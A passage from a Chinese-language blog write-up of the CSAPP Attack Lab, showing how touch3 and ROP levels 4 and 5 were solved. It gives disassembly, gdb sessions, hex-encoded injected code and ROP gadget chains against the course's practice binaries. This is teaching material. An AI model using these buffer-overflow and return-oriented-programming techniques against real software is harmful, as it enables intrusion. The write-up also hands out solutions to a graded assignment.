</code></pre></div><p><strong>任务:</strong> 你的任务<code>getbuf</code>之后执行<code>touch3</code>而不是继续执行test。你必须要传递<code>cookie</code>字符串作为参数。每次运行时，堆栈中的地址保持不变，并在堆栈中存储一个字符串。</p><p>小建议</p><ul><li>你需要在利用缓冲区溢出的字符串中包含<code>cookie</code>的字符串表示形式。该字符串应该有8个十六进制数组成。注意没有前导0x</li><li>注意在c语言中的字符串表示会在末尾处加一个<code>\0</code></li><li>您注入的代码应将寄存器％rdi设置为此字符串的地址</li><li>调用函数hexmatch和strncmp时，它们会将数据压入堆栈，从而覆盖存放<code>getbuf</code>使用的缓冲区的内存部分。 因此，您需要注意在哪里放置您的<code>Cookie</code>字符串</li></ul><p>字符串必须放在ret地址后面，因为后面函数执行时(在hexmatch函数里,向系统请求了100字节的空间，使可能覆盖变为铁定会覆盖)，会覆盖掉字符串。
而hexmatch比较的是字符串，所以cookie还要转换成字符串(用16进制表示)</p><p><strong>简单分析touch3</strong></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=color:#ae81ff>00000000004018f</span>a <span style=color:#f92672>&lt;</span>touch3<span style=color:#f92672>&gt;:</span>
  <span style=color:#ae81ff>4018f</span>a: <span style=color:#ae81ff>53</span>                    push   <span style=color:#f92672>%</span>rbx
  <span style=color:#ae81ff>4018f</span>b: <span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> fb              mov    <span style=color:#f92672>%</span>rdi,<span style=color:#f92672>%</span>rbx
  <span style=color:#ae81ff>4018f</span>e: c7 <span style=color:#ae81ff>05</span> d4 <span style=color:#ae81ff>2</span>b <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>03</span>  movl   <span style=color:#960050;background-color:#1e0010>$</span><span style=color:#ae81ff>0x3</span>,<span style=color:#ae81ff>0x202bd4</span>(<span style=color:#f92672>%</span>rip)        <span style=color:#960050;background-color:#1e0010>#</span> <span style=color:#ae81ff>6044</span>dc <span style=color:#f92672>&lt;</span>vlevel<span style=color:#f92672>&gt;</span>
  <span style=color:#ae81ff>401905</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> 
  <span style=color:#ae81ff>401908</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> fe              mov    <span style=color:#f92672>%</span>rdi,<span style=color:#f92672>%</span>rsi
  <span style=color:#ae81ff>40190</span>b: <span style=color:#ae81ff>8</span>b <span style=color:#ae81ff>3</span>d d3 <span style=color:#ae81ff>2</span>b <span style=color:#ae81ff>20</span> <span style=color:#ae81ff>00</span>     mov    <span style=color:#ae81ff>0x202bd3</span>(<span style=color:#f92672>%</span>rip),<span style=color:#f92672>%</span>edi        <span style=color:#960050;background-color:#1e0010>#</span> <span style=color:#ae81ff>6044e4</span> <span style=color:#f92672>&lt;</span>cookie<span style=color:#f92672>&gt;</span>
  <span style=color:#ae81ff>401911</span><span style=color:#f92672>:</span> e8 <span style=color:#ae81ff>36</span> ff ff ff        callq  <span style=color:#ae81ff>40184</span>c <span style=color:#f92672>&lt;</span>hexmatch<span style=color:#f92672>&gt;</span>
  <span style=color:#ae81ff>401916</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>85</span> c0                 test   <span style=color:#f92672>%</span>eax,<span style=color:#f92672>%</span>eax
</code></pre></div><p>逻辑非常简单首先把<code>rdi</code>的值传递给<code>rsi</code>然后把<code>cookie</code>的值传递给<code>rdi</code>调用hexmatch函数。这里<code>rsi</code>的值应该就是我们的字符串数组的起始地址。</p><p>这里我们注意<code>hexmatch</code>函数里也开辟了栈帧。并且还有随机栈偏移动。可以说字符串<code>s</code>的地址我们是没法估计 的。并且提示中告诉了我们<code>hexmatch</code>和<code>strncmp</code>函数可能会覆盖我们<code>getbuf</code>的缓冲区。所以我们的注入代码要放在一个安全的位置。我们可以把它放到<code>text</code>的栈帧中。我们在<code>getbuf</code>分配栈帧之前打一个断点。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>b *0x4017a8
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> b *0x4017a8
Breakpoint <span style=color:#ae81ff>1</span> at 0x4017a8: file buf.c, line 12.
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> r -q  <span style=color:#75715e>#gdb调试时传参数放在里面</span>
Starting program: /csapp/attack/ctarget -q
warning: Error disabling address space randomization: Operation not permitted
Missing separate debuginfos, use: yum debuginfo-install glibc-2.28-127.el8.x86_64
Cookie: 0x59b997fa

Breakpoint 1, getbuf <span style=color:#f92672>()</span> at buf.c:12
<span style=color:#ae81ff>12</span>  buf.c: No such file or directory.
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> info r rsp
rsp            0x5561dca0          0x5561dca0
</code></pre></div><p>stack : <code>padding(00..) + pop_rdi(0x40141b) + arg1(stack_str) + touch3(0x4018fa) + stack_str(str(cookies))</code></p><p></p><pre><code>48 c7 c7 a8 dc 61 55 68 &lt;-读入我们要执行的汇编语句
fa 18 40 00 c3 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 
35 39 62 39 39 37 66 61 &lt;-返回地址为rsp 
</code></pre><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>Attack Lab$ ./hex2raw &lt;touch3.txt&gt;3.txt 
Attack Lab$ ./ctarget -qi 3.txt 
</code></pre></div><h3 id=21level-4><strong>2.1level 4</strong><a hidden class=anchor aria-hidden=true href=#21level-4>#</a></h3><p>思考：
首先要把cookie传入%rdi，然后再转入到touch2函数。</p><p>根据readme.pdf的命令列表，在gadets farm中没有发现popq %rdi。于是可以先popq %rax，然后movq %rax, %rdi</p><p>这里的缓冲区完全被junk填充，然后从getbuf的ret向下执行。用到了两个gadget，所用到的data也放在了栈上。</p><p>方法一</p><pre><code>AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
cc 19 40 00 00 00 00 00     /* jump 0x4019cc; popq %rax         */
fa 97 b9 59 00 00 00 00     /* cookie                           */
c5 19 40 00 00 00 00 00     /* jump 0x4019c5; movq %rax, %rdi   */
ec 17 40 00 00 00 00 00     /* touch2                           */
</code></pre><p>方法二</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>@le2.txt
<span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>
<span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>
<span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>
<span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>
<span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>
<span style=color:#ae81ff>19</span> 2b <span style=color:#ae81ff>40</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#75715e>#pop %rdi</span>
fa <span style=color:#ae81ff>97</span> b9 <span style=color:#ae81ff>59</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#75715e>#cookie</span>
ec <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>40</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#75715e>#touch2</span>
</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>./hex2raw &lt; le2.txt | ./rtarget -q
</code></pre></div><h3 id=22level-5><strong>2.2level 5</strong><a hidden class=anchor aria-hidden=true href=#22level-5>#</a></h3><p>肝不动了，参考别人的。</p><p>思考：</p><p>同Phase 5一样，这里也需要考虑如何存放cookie字符串，并且多了一个传递字符串地址到%rdi的难题。</p><p>首先，getbuf的缓冲区应该全部填充为junk，那么cookie字符串为了不干扰exploit的正常运行，必然要放在exploit的最后。</p><p>第二个问题，一开始在gadgets farm找到许多如下的操作：</p><p>mov $0x909078fb,%eax
lea -0x3c3876b8(%rdi),%eax
movl $0xc7c78948,(%rdi)
&mldr;&mldr;
所以考虑过能否使用这些数值来拼凑一个地址，然后把cookie字符串放在那里。但是由于有栈随机化，所以这个思路不行。</p><p>后来看了一些解答，发现居然有movq %rsp, %rax这样的神操作，那样就可以用(%rsp) + x的方式来得到cookie字符串的地址了。然后就是一通拼拼凑凑，用了8个gadgets完成了exploit。</p><p>exploit-5
关于这种需要很多gadgets才能完成的exploit，觉得思路肯定是最重要的，但是思路明晰之后，在组成gadgets的链条时，不妨用倒序查找的方法，也许会快一些。当然，今后肯定会使用一些查找gadgets的工具啦。</p><pre><code>AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
AA AA AA AA AA AA AA AA
06 1a 40 00 00 00 00 00     /* jump 0x401a06               ;movq %rsp, %rax */
c5 19 40 00 00 00 00 00     /* jump 0x4019c5               ;movq %rax, %rdi */
ab 19 40 00 00 00 00 00     /* jump 0x4019ab               ;popq %rax       */
48 00 00 00 00 00 00 00     /* distance from here to cookie string          */
dd 19 40 00 00 00 00 00     /* jump 0x4019dd               ;movl %eax, %edx */
34 1a 40 00 00 00 00 00     /* jump 0x401a34               ;movl %edx, %ecx */
13 1a 40 00 00 00 00 00     /* jump 0x401a13               ;movl %ecx, %esi */
d6 19 40 00 00 00 00 00     /* jump 0x4019d6        ;lea (%rdi,%rsi,1),%rax */
c5 19 40 00 00 00 00 00     /* jump 0x4019c5               ;movq %rax, %rdi */
fa 18 40 00 00 00 00 00     /* touch3                                       */
35 39 62 39 39 37 66 61     /* cookie string                                */
00 00 00 00 00 00 00 00     /* string ends with 00                          */
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://inten.kro1lsec.com/tags/csapplab/>CSAPPLAB</a></li><li><a href=https://inten.kro1lsec.com/tags/%E5%A4%A9%E9%97%AE%E4%B9%8B%E8%B7%AF/>天问之路</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share [CSAPPLAB]Attack Lab on twitter" href="https://twitter.com/intent/tweet/?text=%5bCSAPPLAB%5dAttack%20Lab&url=https%3a%2f%2finten.kro1lsec.com%2fpost%2fcsapplabattack-lab%2f&hashtags=CSAPPLAB%2c%e5%a4%a9%e9%97%ae%e4%b9%8b%e8%b7%af"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share [CSAPPLAB]Attack Lab on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2finten.kro1lsec.com%2fpost%2fcsapplabattack-lab%2f&title=%5bCSAPPLAB%5dAttack%20Lab&summary=%5bCSAPPLAB%5dAttack%20Lab&source=https%3a%2f%2finten.kro1lsec.com%2fpost%2fcsapplabattack-lab%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share [CSAPPLAB]Attack Lab on reddit" href="https://reddit.com/submit?url=https%3a%2f%2finten.kro1lsec.com%2fpost%2fcsapplabattack-lab%2f&title=%5bCSAPPLAB%5dAttack%20Lab"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share [CSAPPLAB]Attack Lab on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2finten.kro1lsec.com%2fpost%2fcsapplabattack-lab%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share [CSAPPLAB]Attack Lab on whatsapp" href="https://api.whatsapp.com/send?text=%5bCSAPPLAB%5dAttack%20Lab%20-%20https%3a%2f%2finten.kro1lsec.com%2fpost%2fcsapplabattack-lab%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share [CSAPPLAB]Attack Lab on telegram" href="https://telegram.me/share/url?text=%5bCSAPPLAB%5dAttack%20Lab&url=https%3a%2f%2finten.kro1lsec.com%2fpost%2fcsapplabattack-lab%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2021 <a href=https://inten.kro1lsec.com/>intenのblog🍦</a></span>
<span>&#183;</span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>window.onload=function(){localStorage.getItem("menu-scroll-position")&&(document.getElementById('menu').scrollLeft=localStorage.getItem("menu-scroll-position"))};function menu_on_scroll(){localStorage.setItem("menu-scroll-position",document.getElementById('menu').scrollLeft)}document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script><script>document.querySelectorAll('pre > code').forEach(b=>{const d=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function c(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),c();return}const a=document.createRange();a.selectNodeContents(b);const d=window.getSelection();d.removeAllRanges(),d.addRange(a);try{document.execCommand('copy'),c()}catch(a){}d.removeRange(a)}),d.appendChild(a)})</script></body></html>